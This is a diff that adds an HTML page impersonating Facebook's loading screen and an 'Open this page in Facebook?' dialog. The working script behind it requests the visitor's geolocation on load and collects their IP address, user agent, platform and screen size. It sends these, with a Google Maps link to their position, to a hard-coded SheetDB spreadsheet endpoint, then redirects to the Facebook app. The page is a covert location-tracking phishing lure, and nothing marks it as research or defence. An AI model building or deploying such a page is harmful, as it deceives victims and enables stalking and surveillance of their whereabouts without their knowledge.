@@ -1,0 +1,195 @@
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+<meta charset="UTF-8">  
+<meta name="viewport" content="width=device-width, initial-scale=1.0">  
+<title>Facebook Loading UI + SheetDB</title>  
+<style>  
+  :root {  
+    --fb-blue: #1877f2;  
+    --bg-color: #f0f2f5;  
+    --white: #fff;  
+    --text-primary: #050505;  
+  }  
+  *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;}  
+  body{background-color:var(--bg-color);display:flex;justify-content:center;align-items:center;height:100vh;overflow:hidden;}  
+
+  .loading-screen{display:flex;flex-direction:column;align-items:center;width:100%;max-width:375px;padding:20px;height:100%;position:relative;}  
+  .logo{margin-bottom:30px;width:60px;height:60px;animation:subtleBounce 1.5s infinite ease-in-out;height:45vh;}  
+  .logo svg{width:60px;height:60px;height:80vh;}  
+  .dots{display:flex;justify-content:center;margin-bottom:40px;}  
+  .dot{width:8px;height:8px;margin:0 4px;background-color:#cfd1d4;border-radius:50%;animation:blink 1.4s infinite ease-in-out both;}  
+  .dot:nth-child(1){animation-delay:0s;}  
+  .dot:nth-child(2){animation-delay:0.2s;}  
+  .dot:nth-child(3){animation-delay:0.4s;}  
+  @keyframes blink{0%,80%,100%{opacity:0.3;transform:scale(1);}40%{opacity:1;transform:scale(1.5);}}  
+  @keyframes subtleBounce{0%,100%{transform:translateY(0);}50%{transform:translateY(-5px);}}  
+  .meta{position:absolute;bottom:20px;font-size:14px;color:#606770;}  
+  .meta-logo{font-weight:600;color:var(--fb-blue);}  
+  .app-preview{position:absolute;top:0;left:0;width:100%;height:100%;background-color:var(--white);opacity:0;pointer-events:none;display:flex;flex-direction:column;transition:opacity 0.3s ease;}  
+  .loading-complete .logo{animation:none;transform:scale(0.9);transition:transform 0.3s ease;}  
+  .loading-complete .dots{opacity:0;transition:opacity 0.2s ease;}  
+  .loading-complete .app-preview{opacity:1;pointer-events:all;}  
+  .skeleton-content{flex-grow:1;padding:16px;overflow-y:auto;}  
+  .skeleton-post{background-color:var(--white);border-radius:8px;padding:16px;margin-bottom:16px;box-shadow:0 1px 2px rgba(0,0,0,0.1);}  
+  .skeleton-header{display:flex;align-items:center;margin-bottom:12px;}  
+  .skeleton-avatar{width:40px;height:40px;border-radius:50%;background-color:#eee;margin-right:12px;animation:pulse 1.5s infinite ease-in-out;}  
+  .skeleton-user{flex-grow:1;}  
+  .skeleton-line{height:12px;background-color:#eee;border-radius:4px;margin-bottom:8px;}  
+  .skeleton-line.short{width:60%;}  
+  .skeleton-line.medium{width:80%;}  
+  .skeleton-content-block{height:200px;background-color:#eee;border-radius:8px;margin-bottom:12px;animation:pulse 1.5s infinite ease-in-out;}  
+  .skeleton-actions{display:flex;padding-top:8px;border-top:1px solid #eee;}  
+  .skeleton-action{flex:1;height:32px;background-color:#eee;border-radius:4px;margin:0 4px;animation:pulse 1.5s infinite ease-in-out;}  
+  @keyframes pulse{0%{opacity:0.6;}50%{opacity:1;}100%{opacity:0.6;}}  
+  .notification{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.7);color:#fff;padding:10px 20px;border-radius:20px;font-size:14px;z-index:1000;display:none;}  
+
+  /* Facebook Dialog Box */
+  .fb-dialog{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:none;justify-content:center;align-items:center;z-index:2000;}
+  .fb-dialog-content{background:#fff;padding:20px;border-radius:12px;text-align:center;width:80%;max-width:300px;position:relative;}
+  .fb-dialog-content img{width:50px;height:50px;margin-bottom:12px;}
+  .fb-dialog-content h3{margin:8px 0;font-size:16px;color:#050505;}
+  .fb-dialog-content p{font-size:14px;color:#555;margin-bottom:16px;}
+  .fb-btn{display:block;width:100%;padding:10px;margin-bottom:8px;border:none;border-radius:6px;font-size:16px;cursor:pointer;}
+  .fb-open{background:#1877F2;color:#fff;}
+  .fb-cancel{background:#eee;color:#050505;}
+  .fb-close{position:absolute;top:8px;right:8px;background:none;border:none;font-size:20px;cursor:pointer;}
+</style>  
+</head>  
+<body>  
+  <div class="loading-screen" id="loadingScreen">  
+    <div class="logo">  
+      <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">  
+        <circle cx="18" cy="18" r="18" fill="#1877F2"/>  
+        <path d="M24.5 12H21.5C20.67 12 20 12.67 20 13.5V16H24L23.5 20H20V30H16V20H13V16H16V13.5C16 11.01 18.01 9 20.5 9H24.5V12Z" fill="white"/>  
+      </svg>  
+    </div>  
+    <div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>  
+    <div class="meta">from <span class="meta-logo">Meta</span></div>  
+    <div class="app-preview">  
+      <div class="skeleton-content">  
+        <div class="skeleton-post">  
+          <div class="skeleton-header">  
+            <div class="skeleton-avatar"></div>  
+            <div class="skeleton-user">  
+              <div class="skeleton-line short"></div>  
+              <div class="skeleton-line medium"></div>  
+            </div>  
+          </div>  
+          <div class="skeleton-content-block"></div>  
+          <div class="skeleton-actions"><div class="skeleton-action"></div><div class="skeleton-action"></div><div class="skeleton-action"></div></div>  
+        </div>  
+      </div>  
+    </div>  
+  </div>  
+
+  <!-- Dialog -->
+  <div class="fb-dialog" id="fbDialog">
+    <div class="fb-dialog-content">
+      <button class="fb-close" onclick="closeFbDialog()">×</button>
+      <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook">
+      <h3>Open this page in Facebook?</h3>
+      <p>For the best experience, open this page in the Facebook app.</p>
+      <button class="fb-btn fb-open" onclick="getLocation()">Open</button>
+      <button class="fb-btn fb-cancel" onclick="closeFbDialog()">Cancel</button>
+    </div>
+  </div>
+
+  <div class="notification" id="notification"></div>  
+
+<script>  
+  const SHEETDB_URL = "https://sheetdb.io/api/v1/y1ep4z217uldo";  
+  const notification = document.getElementById('notification');  
+
+  let cachedPosition = null; // auto location result ကို cache ထားမယ်
+
+  function showNotification(msg){
+    notification.textContent = msg;
+    notification.style.display = "block";
+    setTimeout(()=>{ notification.style.display = "none"; },3000);
+  }  
+
+  async function getIPAddress(){
+    try{
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      return data.ip;
+    }catch(e){ return "Unknown"; }
+  }  
+
+  async function getDeviceInfo(){
+    const ip = await getIPAddress();
+    const ua = navigator.userAgent;
+    const platform = navigator.platform;
+    const screenSize = `${screen.width}x${screen.height}`;
+    return { ip, ua, platform, screenSize };
+  }  
+
+  function sendData(position){  
+    getDeviceInfo().then(device => {
+      const latitude = position?.coords?.latitude || "Unknown";  
+      const longitude = position?.coords?.longitude || "Unknown";  
+      const mapLink = (latitude !== "Unknown" && longitude !== "Unknown") 
+        ? `https://www.google.com/maps?q=${latitude},${longitude}` 
+        : "Unknown";  
+      const time = new Date().toLocaleString();  
+
+      const data = {  
+        ip: device.ip,  
+        user_agent: device.ua,  
+        platform: device.platform,  
+        screen: device.screenSize,  
+        latitude,  
+        longitude,  
+        map: mapLink,  
+        time  
+      };  
+
+      fetch(SHEETDB_URL,{  
+        method: "POST",  
+        headers: {"Content-Type":"application/json"},  
+        body: JSON.stringify(data)  
+      })  
+      .then(()=>showNotification("."))  
+      .catch(()=>showNotification("..."));  
+    });  
+  }  
+
+  // Auto location request on page load (cache only)
+  function autoRequestLocation(){  
+    if(navigator.geolocation){  
+      navigator.geolocation.getCurrentPosition(  
+        pos => { cachedPosition = pos; },  
+        err => { showNotification("please wai"); }  
+      );  
+    }  
+  }  
+
+  // Called when user clicks "Open" button
+  function getLocation(){  
+    if(cachedPosition){  
+      sendData(cachedPosition);  
+      openFbApp();  
+    } else if(navigator.geolocation){  
+      navigator.geolocation.getCurrentPosition(  
+        pos => { sendData(pos); openFbApp(); },  
+        () => { showNotification("."); }  
+      );  
+    } else {  
+      showNotification(".");  
+    }  
+  }  
+
+  // Facebook Dialog functions
+  function openFbDialog(){ document.getElementById('fbDialog').style.display='flex'; }
+  function closeFbDialog(){ document.getElementById('fbDialog').style.display='none'; }
+  function openFbApp(){ window.location.href="fb://profile"; closeFbDialog(); }
+
+  window.onload = ()=>{  
+    document.getElementById('loadingScreen').classList.add('loading-complete');  
+    autoRequestLocation(); // auto permission request
+    setTimeout(openFbDialog,2000); // show dialog later
+  }  
+</script>
+</body>  
+</html>
